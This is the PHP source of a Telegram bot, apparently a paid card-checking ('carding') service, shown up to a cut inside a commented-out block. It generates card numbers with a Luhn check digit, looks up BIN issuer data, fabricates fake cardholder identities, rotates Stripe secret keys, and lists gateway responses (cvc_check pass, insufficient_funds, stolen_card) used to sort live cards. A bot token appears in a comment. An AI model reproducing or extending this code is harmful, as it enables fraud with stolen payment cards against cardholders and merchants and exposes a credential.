<?php
//
session_start();
error_reporting(0);
set_time_limit(0);

date_default_timezone_set('America/Buenos_Aires');
$fecha = date("Y/m/d");
//flush();

header("Cache-Control: no-cache, must-revalidate"); // HTTP/1.1
header("Expires: Sat, 26 Jul 1997 05:00:00 GMT"); // Date in the past
header("Pragma: no-cache");

include("config.php");

//------TOKEN DEL BOT MIKASA ACKERMAN--------//
//$token = "5405339405:AAG0kGkeN-8VueVsI2JCLQbHI3wYSnfoG7Y";

$website = "https://api.telegram.org/bot".$token;
$upda = json_decode(file_get_contents('php://input'), true);
$data = file_get_contents("php://input");
$json = json_decode($data, true);
$update = $json["message"];
//---------PERSONAL---------//
$id = $update["from"]["id"];
$Name = $update["from"]["first_name"];
$last = $update["from"]["last_name"];
$message_id = $update["message_id"];
$message = $update["text"];
//----------GRUPOS----------//
$chat_id = $update["chat"]["id"];
$id_new = $update["new_chat_member"]["id"];
$grupo = $update["chat"]["title"];
$nuevo = $update["new_chat_member"]["first_name"]. ' '.$update["new_chat_member"]["last_name"];
//----------------------END VARIABLES----------------------//

$user = $update["from"]["username"];
//------------seguridad-------------//
// ID de tu usuario (para permitir mensajes personales solo para ti)
$myid = "1292171163"; // Reemplaza con tu ID de usuario


//-------------------FUNCIONES------------------//
//sendPv($myid, $data);

$nombres = array("Juan", "María", "Pedro", "Ana", "Carlos", "Luisa", "Jorge", "Sofía");
$nombre = $nombres[rand(0, count($nombres) - 1)];

$fn = array("@gmail.com", "@yahoo.com", "@hotmail.com", "@outlook.com", "@icloud.com", "@mail.com", "@aol.com");
$fin = $fn[rand(0, count($fn) - 1)];
$num = rand(1, 100);
$correo = "$nombre$num$fin";



// Nombres y apellidos de ejemplo
$nombres = ["Liam", "Emma", "Noah", "Olivia", "Aiden", "Sophia"];
$apellidos = ["Smith", "Johnson", "Brown", "Taylor", "Anderson", "Wilson"];
$ciudades = ["Toronto", "Vancouver", "Montreal", "Calgary", "Ottawa"];
$provincias = ["Ontario", "Quebec", "British Columbia", "Alberta", "Nova Scotia"];

// Generar datos aleatorios
$nombre = $nombres[array_rand($nombres)];
$apellido = $apellidos[array_rand($apellidos)];
$correo = strtolower($nombre) . "." . strtolower($apellido) . "".$fin."";
$telefono = "(416) " . rand(100, 999) . "-" . rand(1000, 9999);
$direccion1 = rand(100, 999) . " Main St";
$direccion2 = rand(100, 999) . " Main St";
$ciudad = $ciudades[array_rand($ciudades)];
$zip = strtoupper(chr(rand(65, 90)) . rand(0, 9) . chr(rand(65, 90)) . ' ' . rand(0, 9) . chr(rand(65, 90)) . rand(0, 9));
$provincia = $provincias[array_rand($provincias)];
// Nombres y apellidos de ejemplo
$name = $nombre;
$phone = $telefono;

function capture($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
 return $str[0];
}
function GetStr($string, $start, $end){
$str = explode($start, $string);
$str = explode($end, $str[1]);
return $str[0];
};

function array_in_string($str, array $arr) {
    foreach($arr as $arr_value) {
        if (stripos($str,$arr_value) !== false)
    return true;
    }
    return false;
}

function Calculate($ccnumber, $length)
    {
        $sum = 0;
        $pos = 0;
        $reversedCCnumber = strrev($ccnumber);

        while ($pos < $length - 1) {
            $odd = $reversedCCnumber[$pos] * 2;
            if ($odd > 9) {
                $odd -= 9;
            }
            $sum += $odd;

            if ($pos != ($length - 2)) {

                $sum += $reversedCCnumber[$pos + 1];
            }
            $pos += 2;
        }

     //   # Calculate check digit
        $checkdigit = ((floor($sum / 10) + 1) * 10 - $sum) % 10;
        $ccnumber .= $checkdigit;
        return $ccnumber;
    }


function BinData($bin){
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);

// Extraer cada uno de los elementos
$iin = $data['number']['iin']; // Número IIN
$length = $data['number']['length']; // Longitud
$luhn = $data['number']['luhn']; // Luhn
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$alpha3 = $data['country']['alpha3']; // Código de país alpha3
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$bankPhone = $data['bank']['phone']; // Teléfono del banco
$bankUrl = $data['bank']['url']; // URL del banco
$success = $data['success']; // Estado de éxito
$count = "".$country." - ".$alpha2." ".$emoji."";

if (empty($category)){
   $curl = curl_init('https://bincheck.io/es/details/'.$bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
    //_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);

}

$type = trim($type);
$bank = trim($bank);


if ($type !== "" ){
$tipo = "\n➭ 𝚃𝚈𝙿𝙴: ".$type."";
}
if ($category !== "" ){
$level = "\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$category."";
}
if ($bank !== "" ){
$banco = "\n➭ 𝙱𝙰𝙽𝙺: ".$bank."";
}
$in = "<code>".$bin."</code>";
$bindata = "━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$in."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$tipo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$banco."";

return $bindata;
}

function Bin_Gen_Info($Bin){
$curl = curl_init('https://binlist.io/lookup/'.$Bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);
// Extraer cada uno de los elementos
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$count = "".$country." - ".$alpha2." ".$emoji."";

if (empty($category)){
   $curl = curl_init('https://bincheck.io/es/details/'.$Bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
    //_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);

}                                                                                       
$type = trim($type);
$bank = trim($bank);

$Bin = "<code>".$Bin."</code>";
//$bindata = "━━━━━━━━•⟮ʙɪɴ ᴅᴀᴛᴀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$in."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$tipo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$banco."";
$bingeninfo = "➭ 𝙱𝙸𝙽 𝙸𝙽𝙵𝙾: $scheme - $type - $category\n➭ 𝙱𝙰𝙽𝙺: $bank\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: $count\n";

return $bingeninfo;
}

function Bininfo($bin){
$curl = curl_init('https://binlist.io/lookup/'.$bin.'');
curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
$content = curl_exec($curl);
$data = json_decode($content, true);
curl_close($curl);

// Extraer cada uno de los elementos
$iin = $data['number']['iin']; // Número IIN
$scheme = $data['scheme']; // Esquema
$type = $data['type']; // Tipo
$category = $data['category']; // Categoría
$alpha2 = $data['country']['alpha2']; // Código de país alpha2
$country = $data['country']['name']; // Nombre del país
$emoji = $data['country']['emoji']; // Emoji del país
$bank = $data['bank']['name']; // Nombre del banco
$success = $data['success']; // Estado de éxito
$count = "".$country." - ".$alpha2." ".$emoji."";                     
if (empty($category) || empty($currency)){
   $curl = curl_init('https://bincheck.io/es/details/'.$bin.'');
   curl_setopt($curl, CURLOPT_RETURNTRANSFER, 1);
   curl_setopt($curl, CURLOPT_FOLLOWLOCATION, true);
   $response = curl_exec($curl);
   curl_close($curl);
	//_Nivel de tarjeta_
   preg_match('/Nivel de tarjeta<\/td>\s*<td width="65%" class="p-2">\s*([^<]+)\s*<\/td>/', $response, $matches);
   $category = trim($matches[1]);
   $patron = '/Moneda del país ISO<\/td>\s*<td[^>]*>\s*<div class="font-medium">([^<]+)<\/div>/';
   preg_match($patron, $response, $matches);
   $currency = trim($matches[1]);

}

$type = trim($type);
$bank = trim($bank);


if ($type !== "" ){
$typo = "\n➭ 𝚃𝚈𝙿𝙴: ".$type."";
}
if ($category !== "" ){
$level = "\n➭ 𝙻𝙴𝚅𝙴𝙻: ".$category."";
}
if (trim($bank !== "" )){
$banco = "\n➭ 𝙱𝙰𝙽𝙺: ".$bank."";
}
if ($currency !== "" ){
$moneda = "\n➭ 𝙲𝚄𝚁𝚁𝙴𝙽𝙲𝚈: 💲".$currency."";
}

$Bin = "<code>".$bin."</code>";
$bininfo = "━━━━━━━•⟮ʙɪɴ ᴄʜᴇᴄᴋᴇʀ⟯•━━━━━━━\n➭ 𝙱𝙸𝙽: ".$Bin."\n➭ 𝙱𝚁𝙰𝙽𝙳: ".$scheme."".$typo."".$level."\n➭ 𝙲𝙾𝚄𝙽𝚃𝚁𝚈: ".$count."".$moneda."".$banco."\n";
return $bininfo;
}
//-----------------------VARIABLES-------------------------//

$live_array = array(
    'incorrect_cvc',
    'Your card zip code is incorrect.',
    'The zip code you supplied failed validation.',
    '"cvc_check":"pass"',
    'Thank You.',
    '"status": "succeeded"',
    'Thank You For Donation.',
    'Success',
    'SUCCEEDED',
    '"cvc_check": "fail"',
    '"cvc_check": "pass"',
    '"status": "succeeded"',
    'Your payment has already been processed',
    'Nice! New payment method added',
    'Approved',
    'insufficient_funds',
    'Your card has insufficient funds.',
    "Your card's security code is invalid.",
    "Your card's security code is incorrect.",
    "The card's security code is incorrect.",
    "Your card's expiration month is invalid.",
    'Card Issuer Declined CVV',
    'This transaction cannot be processed. Please enter a valid Credit Card Verification Number.',
    'Insufficient Funds',
    'Transaction not permitted by issuer',
    'EXISTING_ACCOUNT_RESTRICTED',
    'VALIDATION_ERROR',
    '3DS authentication is required.',
    '𝑨𝒑𝒑𝒓𝒐𝒗𝒆𝒅!',
    'Insufficient balance',
    'Charged $10',
//    'Your payment method was rejected due to 3D Secure.',
    'transaction_not_allowed',
    'CVV INVALID',
    'incorrect_zip',
    'pickup_card',
    'lost_card',
    'stolen_card',
    '"seller_message": "Payment complete."'
);
/*
$autorizados = array("1292171163");
$grupos_autorizados = array("-4274242125");
*/

if((strpos($message, "!id") === 0)||(strpos($message, "/id") === 0)||(strpos($message, ".id") === 0)){

$json = json_decode($data, true);
$group_id = $json['message']['chat']['id'];
$private_id = $json['message']['from']['id'];
$private_title = $json['message']['from']['first_name'];
$group_title = $json['message']['chat']['title'];
$chat_type = $json['message']['chat']['type'];


echo "$chat_type\n";


if ($private_title == "Channel"){
        $name_title = $group_title;
        $ID = $group_id;
}else{
        $name_title = $private_title;
        $ID = $private_id;
}
$respuesta = "Nombre: ".$name_title."\nChat: ".$chat_type."\nTU ID: <code>".$ID."</code>";
sendMessage($chat_id,$respuesta,$message_id);
die();

}



$archivo = './app/data/Admins.json';
if (file_exists($archivo) && filesize($archivo) > 0) {
    $datos = json_decode(file_get_contents($archivo), true);
    if (count($datos) > 0) {

        $content = file_get_contents('./app/data/Admins.json');
        $data = json_decode($content, true);
        $autorizados = array_column($data, 'id');
//      $id = implode("\n", $autorizados);
    } else {
        echo "El archivo Admins.json está vacío";
    }
} else {
    echo "El archivo Admins.json no existe o está vacío";
}

$admin = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";


//-----DATOS DE PRUEBA LOCAL--------//

/*

$chat_id = "1292171163";
$id = "1292171163";

echo "TU CCS: ";
$data = trim(fgets(STDIN));
$message = "!".$data."";
*/
///----+------------------------


// 





if ($myid == $id) {
  $tipo = "ᴀᴅᴍɪɴ";
} elseif (in_array($id, $autorizados)) {
  $tipo = "ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ";
} else {
	$tipo = "ғʀᴇᴇ ᴜsᴇʀ";
}




/*
if ($tipo == "ᴘʀᴇᴍɪᴜᴍ ᴜsᴇʀ") {
// PERMITE QUE UN USUARIO PREMIUM ENVIE MENSAJES AL PV DEL BOT :V
}elseif($id == "1292171163"){
// PERMITE QUE EL DUEÑO ENVIE MENSAJES AL PV DEL BOT :V
}elseif($chat_id == '4274242125'){
// PERMITE QUE ENVIAR MENSAJES A UN GRUPO :v
            }else{
//------MENSAJE AL USUARIO------//
$contact = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
$respuesta = "━━━━━━━•⟮𝑁𝑎𝑧𝑢𝑛𝑎 𝑁𝑎𝑛𝑎𝑘𝑢𝑠𝑎⟯•━━━━━━━\nHola ".$name." este bot es premium y para poder acceder a el necesitas una key de autorización.\n\nAdquiérelo yaa!.\n\n".
'Telegram ➜ '.$contact.'';
sendMessage($id,$respuesta,$message_id);
//------MENSAJE PERSONAL-------//
$personal = "Hola Rigo Jimenez, ".$name." Intento Acceder a tu Bot";
sendMessage("1292171163",$personal);
die();
}
//}
*/

// Verificamos si el mensaje es personal o de grupo
if ($update["from"]["id"] == $myid || in_array($update["from"]["id"], $autorizados) || in_array($update["chat"]["id"], $autorizados)) {
	// Procesar mensaje
} else {
	// Enviar mensaje de error
	$contact = "<a href='t.me/rigo_jz'>ʀɪɢᴏ ᴊɪᴍᴇɴᴇᴢ</a>";
	$respuesta = "━━━━━━━•⟮𝑁𝑎𝑧𝑢𝑛𝑎 𝑁𝑎𝑛𝑎𝑘𝑢𝑠𝑎⟯•━━━━━━━\nHola ".$Name." este bot es premium y para poder acceder a el necesitas una key de autorización.\n\nAdquiérelo yaa!.\n\n".
	'Telegram ➜ '.$contact.'';
	sendMessage($chat_id,$respuesta,$message_id);
	//------MENSAJE PERSONAL-------//
        $personal = "Hola Rigo Jimenez, ".$Name." Intento Acceder a tu Bot";
        sendPv($myid, $personal);
        die();
}

if((strpos($message, "!") === 0)||(strpos($message, "/") === 0)||(strpos($message, ".") === 0)){

$timeout = 30; // Tiempo de espera en segundos
$maxMessages = 3; // Máximo de mensajes permitidos
$file = 'users.txt';
$userId = $id; // Reemplaza con la lógica para obtener el ID del usuario actual

try {
    if (file_exists($file)) {
        $data = json_decode(file_get_contents($file), true);
    } else {
        $data = array();
    }

    if (!isset($data[$userId])) {
        $data[$userId] = array('lastSend' => 0, 'count' => 0);
    }

    $lastSend = $data[$userId]['lastSend'];
    $count = $data[$userId]['count'];
    $diff = time() - $lastSend;

    if ($diff >= $timeout) {
        $count = 0; // Resetear contador después del timeout
    }

    if ($count >= $maxMessages) {
        $respuesta = '⏳Por favor, espera ' . ($timeout - $diff) . ' segundos antes de enviar otro mensaje.';
        sendMessage($chat_id, $respuesta, $message_id);
 //       echo "$respuesta\n";
        exit;
    }

    // Envía el mensaje...
    $count++;
    $data[$userId] = array('lastSend' => time(), 'count' => $count);
    file_put_contents($file, json_encode($data));
//    echo "Mensaje enviado con éxito.\n";
} catch (Exception $e) {
    echo 'Error: ' . $e->getMessage();
    exit;
}
}



//-------EXTRAE EL SK_LIVE----//
$sk = $config['sk_keys'];
shuffle($sk);
$sec = $sk[0];



unlink("cookie.txt");



	
$file = './app/data/Admins.json';
if (strpos($message, "/vip") === 0) {
	
	if ($id == $myid){
		
	} else {
    // Mensaje de error para IDs no autorizados
		$respuesta = "Acceso restringido!!!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}

	$nombre = '';
	$userId = substr($message, 5);

	if ($userId == $myid) {
		$respuesta = "$userId es el Admin!";
		sendMessage($chat_id, $respuesta, $message_id);
		die();
	}
	
	if (is_numeric($userId) && $userId != '') {
		
		$url = 'https://api.telegram.org/bot' . $token . '/getChat?chat_id=' . $userId;
		$ch = curl_init($url);
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
		$response = curl_exec($ch);
		curl_close($ch);

		$userData = json_decode($response, true);
		$type = $userData['result']['type'];

		if ($userData['ok']) {

			if ($type == "private") {
				$nombre = $userData['result']['first_name'] . ' ' . ($userData['result']['last_name'] ?? '');
				$username = $userData['result']['username'] ?? 'No tiene username';
			} elseif (in_array($type, ["group", "supergroup", "channel"])) {
				$nombre = $userData['result']['title'];
				$username = $userData['result']['username'];
			}
		} else {
//        $respuesta = "Error: " . $userData['description'];
			$respuesta = "Usuario no encontrado!!!";
			sendMessage($chat_id, $respuesta, $message_id);
			die();
		}



   // if (is_numeric($userId) && $userId != '') {

		$usersFile = fopen($file, 'r+');
		$usersData = json_decode(fread($usersFile, filesize($file)), true);

		$usersData[$userId] = [
			'id' => $userId,
			'type' => $type,
			'name' => $nombre,
			'username' => $username,
			'premium' => true
			];
		ftruncate($usersFile, 0);
		rewind($usersFile);
		fwrite($usersFile, json_encode($usersData, JSON_PRETTY_PRINT));
		$newContent = json_encode($usersData, JSON_PRETTY_PRINT);
//      echo "$newContent\n";
		Send_data($newContent);
		fclose($usersFile);

		$respuesta = "El usuario ({$userId}) ahora es premium!";
		
	} else {
		$respuesta = "Formato inválido. Use !vip xxxxx";
//echo "$respuesta\n";
	}
	sendMessage($chat_id, $respuesta, $message_id);
	die();
}



function Send_data($newContent) {
    unlink('./app/data/Admins.json');

    $api_token = file_get_contents('/etc/secrets/API_TOKEN');
    $repoName = 'r1gox/CheckerBot';
    $filePath = 'CheckerBot/public/app/data/Admins.json';

    $url = 'https://api.github.com/repos/' . $repoName . '/contents/' . $filePath;
    $headers = array(
        'Authorization: Bearer ' . $api_token,
        'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
    );

    // Obtener el SHA del archivo existente
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    $response = curl_exec($ch);
    curl_close($ch);
    $fileData = json_decode($response, true);

    // Reemplazar el contenido del archivo
    $data = array(
        'message' => 'Actualizar archivo',
        'content' => base64_encode($newContent),
        'sha' => $fileData['sha']
    );

    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));
    $response = curl_exec($ch);
    curl_close($ch);

    sendMessage($chat_id, $response, $message_id);
}

/*
function Send_data($newContent){

unlink('./app/data/Admins.json');
//$api_token = getenv('API_TOKEN');
$api_token = file_get_contents('/etc/secrets/API_TOKEN');
	
$repoName = 'r1gox/CheckerBot';
$filePath = 'CheckerBot/public/app/data/Admins.json';
//$filePath = 'Admin.json';

// Paso 1: Intentar obtener el contenido actual del archivo
$url = 'https://api.github.com/repos/' . $repoName . '/contents/' . $filePath;
$headers = array(
    'Authorization: Bearer ' . $api_token,
    'User-Agent: Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Mobile Safari/537.36'
);

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

$response = curl_exec($ch);
curl_close($ch);

$fileData = json_decode($response, true);

// Paso 2: Verificar si el archivo existe
if (isset($fileData['message']) && $fileData['message'] === 'Not Found') {
    // El archivo no existe, así que lo creamos
    $data = array(
        'message' => 'Crear nuevo archivo',
        'content' => base64_encode($newContent)
    );

    // Crear el archivo
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));

    $response = curl_exec($ch);
    curl_close($ch);

    echo "Archivo creado: " . $response;

} else {
    // El archivo existe; procedemos a agregar nuevos datos
    $currentContent = base64_decode($fileData['content']);
    $currentSha = $fileData['sha'];

    // Agregar los nuevos datos
    $updatedContent = $currentContent . $newContent;

    // Preparar la solicitud para actualizar el archivo
    $data = array(
        'message' => 'Agregar más datos al archivo',
        'content' => base64_encode($updatedContent),
        'sha' => $currentSha // Necesitamos el sha para la actualización
    );

    // Actualizar el archivo
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'PUT');
    curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($data));
    curl_setopt($ch, CURLOPT_HTTPHEADER, array_merge($headers, ['Content-Type: application/json']));

    $response = curl_exec($ch);
    curl_close($ch);
    sendMessage($chat_id, $response, $message_id);
   // echo "Archivo actualizado: " . $response;
}
}
*/


/*
$file = 'Admins.json';
if (strpos($message, "/vip") === 0) {
    $nombre = '';

    $userId = substr($message, 5);
    if ($userId == $myid) {
        $respuesta = "$userId es el Admin!";
        sendMessage($chat_id, $respuesta, $message_id);
        die();

    }

   // if (is_numeric($userId) && $userId != '') {

    $url = 'https://api.telegram.org/bot' . $token . '/getChat?chat_id=' . $userId;
    $ch = curl_init($url);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    $response = curl_exec($ch);
    curl_close($ch);

    $userData = json_decode($response, true);

    if ($userData['ok']) {
        $nombre = $userData['result']['first_name'] . ' ' . ($userData['result']['last_name'] ?? '');
        $username = $userData['result']['username'] ?? 'No tiene username';
    } else {
//        $respuesta = "Error: " . $userData['description'];
        $respuesta = "Usuario no encontrado!!!";
        sendMessage($chat_id, $respuesta, $message_id);
        die();
    }



    if (is_numeric($userId) && $userId != '') {
        $usersFile = fopen($file, 'r+');
        $usersData = json_decode(fread($usersFile, filesize($file)), true);

        $usersData[$userId] = [
            'id' => $userId,
            'name' => $nombre,
            'username' => $username,
            'premium' => true
        ];

        ftruncate($usersFile, 0);
        rewind($usersFile);
        fwrite($usersFile, json_encode($usersData, JSON_PRETTY_PRINT));
        fclose($usersFile);




        $respuesta = "El usuario ({$userId}) ahora es premium!";
    } else {
        $respuesta = "Formato inválido. Use !vip xxxxx";
    }

    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

*/



if (strpos($message, "/unvip") === 0) {
    $user = substr($message, 7);
    if (is_numeric($user) && $user != '') {
        $fp = fopen($file, 'r+');
        $content = fread($fp, filesize($file));
        $users = json_decode($content, true);
        unset($users[$user]);
        ftruncate($fp, 0);
        rewind($fp);
        fwrite($fp, json_encode($users, JSON_PRETTY_PRINT));
        fclose($fp);
        $respuesta = "El usuario ($user) ya no es premium.";
    } else {
        $respuesta = "Formato inválido. Use !unvip xxxxx";
    }
    sendMessage($chat_id, $respuesta, $message_id);
    die();
}





$file = file_get_contents('./app/data/Admins.json');

if (strpos($message, "!listvip") === 0) {

    $users = json_decode($file, true);
    $premiums = array_filter($users, function($user) {
        return $user['premium'];
    });

    if (count($premiums) > 0) {
        $respuesta = "♕ ᵁˢᵘᵃʳᶤᵒˢ ᴾʳᵉᵐᶤᵘᵐ ♕\n\n";
        foreach ($premiums as $id => $user) {
            $username = !empty($user['username']) ? "(@{$user['username']})" : '';
            $type = !empty($user['type']) ? " - {$user['type']}" : '';
            $respuesta .= "➩ <code>$id</code> - {$user['name']} $username$type\n";
        }
    } else {
        $respuesta = "No hay usuarios premium.";
    }

    sendMessage($chat_id, $respuesta, $message_id);
    die();
}

/*
if((strpos($message, "!vip") === 0)||(strpos($message, "/vip") === 0)||(strpos($message, ".vip") === 0))
{


$date = time();
$fn = "Admins.json";
$fp = fopen($fn, 'r+');


$ban = substr($message, 5);
//$ban = "8383838386";
if (is_numeric($ban) && ($ban != '')){
        // Lee el contenido actual del archivo
        $content = fread($fp, filesize($fn));
        $users = json_decode($content, true); // Decodifica el JSON

   $users[$ban] = array('user' => $ban, 'premium' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "El usuario (".$ban.") ahora es premium!♕\n";
   sendMessage($chat_id,$respuesta,$message_id);

          // Vuelve al inicio del archivo y guarda los cambios
        ftruncate($fp, 0); // Limpia el archivo
        rewind($fp); // Vuelve al inicio
        fwrite($fp, json_encode($users, JSON_PRETTY_PRINT)); // Escribe el nuevo contenido
        fclose($fp); // Cierra el archivo
        die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();

}
}
*/

/*
$date = time();
$fn = "Admins.json";
$fp = fopen($fn, 'r+');

if($id == '1292171163'){

if((strpos($message, "!vip") === 0)||(strpos($message, "/vip") === 0)||(strpos($message, ".vip") === 0))
{

$ban = substr($message, 5);
//$ban = "8383838386";
if (is_numeric($ban) && ($ban != '')){
	// Lee el contenido actual del archivo
        $content = fread($fp, filesize($fn));
        $users = json_decode($content, true); // Decodifica el JSON

   $users[$ban] = array('user' => $ban, 'premium' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "El usuario (".$ban.") ahora es premium!♕\n";
   sendMessage($chat_id,$respuesta,$message_id);

	  // Vuelve al inicio del archivo y guarda los cambios
        ftruncate($fp, 0); // Limpia el archivo
        rewind($fp); // Vuelve al inicio
	fwrite($fp, json_encode($users, JSON_PRETTY_PRINT)); // Escribe el nuevo contenido
	fclose($fp); // Cierra el archivo
	die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();

}
}


if((strpos($message, "!free") === 0)||(strpos($message, "/free") === 0)||(strpos($message, ".free") === 0)){

//$unban = "838383838";
$unban = substr($message, 6);
if (is_numeric($unban) && ($unban != '')){

   $users[$unban] = array('user' => $unban, 'premium' => false);
   $unban = "<code>".$unban."</code>";
   $respuesta = "El usuario (".$unban.") a sido bloqueado de la versión premium!\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);
die();
}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
}

}else{
$respuesta = "❌ (free: ($chat_id) ($id) Función no disponible para usuarios Free!\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}






$date = time();
$fn = "users.json";
$fp = fopen($fn, 'r+');
$users = file_get_contents($fn);
$users = json_decode($users, true);


if($id == '1292171163'){


if((strpos($message, "!ban") === 0)||(strpos($message, "/ban") === 0)||(strpos($message, ".ban") === 0))
{
$ban = substr($message, 5);
if (is_numeric($ban) && ($ban != '')){
   $users[$ban] = array('registered' => true, 'msgs' => 0, 'date' => 0, 'banned' => true);
   $ban = "<code>".$ban."</code>";
   $respuesta = "🔒 El usuario (".$ban.") a sido baneado\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);

}else{
$respuesta = "━━━━━━━•⟮ʙaɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
sendMessage($chat_id,$respuesta,$message_id);
die();
}
}




if((strpos($message, "!unban") === 0)||(strpos($message, "/unban") === 0)||(strpos($message, ".unban") === 0)){

$unban = substr($message, 7);
if (is_numeric($unban) && ($unban != '')){

   $users[$unban] = array('registered' => true, 'msgs' => 0, 'date' => $date, 'banned' => false);
   $unban = "<code>".$unban."</code>";
   $respuesta = "🚫 El usuario (".$unban.") a sido desbaneado\n";
   sendMessage($chat_id,$respuesta,$message_id);
   $users = json_encode($users);
   file_put_contents($fn, $users);
   fclose($fp);
//die();
}else{
$respuesta = "━━━━━━━•⟮ʙɪɴ ɪɴғᴏ⟯•━━━━━━━\n\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: /bin xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: !ban xxxxx\n❗𝙵𝙾𝚁𝙼𝙰𝚃𝙾 1: .ban xxxxx\n";
